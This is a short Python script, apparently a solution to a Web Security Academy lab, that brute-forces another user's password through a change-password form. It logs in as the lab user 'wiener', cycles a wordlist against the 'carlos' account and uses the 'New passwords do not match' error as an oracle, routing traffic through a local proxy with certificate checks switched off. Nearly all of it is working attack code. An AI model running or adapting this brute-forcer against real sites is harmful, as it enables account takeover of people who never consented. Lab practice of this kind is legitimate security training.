import requests 
import urllib3 

# Suppress the warning about unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration (usually for tools like Burp Suite, Fiddler, etc.)
proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}


url = "https://0a9300d704afbcaf827e0689008b00c2.web-security-academy.net/"

data = {"username":"wiener","password":"peter"}

wiener_session = requests.Session()  # Create a session object for wiener user 

response = wiener_session.post(url + "login",verify=False,data=data,proxies=proxies)
print("session of winer user is",wiener_session.cookies.get_dict())


carlos_session = wiener_session

with open('password.txt','r') as file:
    for line in file:
        password = line.strip()  # Remove newline and extra spaces
        #print("Testing password:", password)

        data = {"username":"carlos","current-password":password,"new-password-1":password,"new-password-2":"peter"}
        carlos_response = carlos_session.post(url+"my-account/change-password",data=data,proxies=proxies,verify=False)
        if "New passwords do not match" in carlos_response.text:
            print("You have found the correct password",password)
            #new_password = f"You have found the correct password",{password}
            break
    #data_carlos_login = {"username":"carlos","password":new_password}
    #carlos_response = carlos_session.post(url,data=data_carlos_login,proxies=proxies,verify=False)
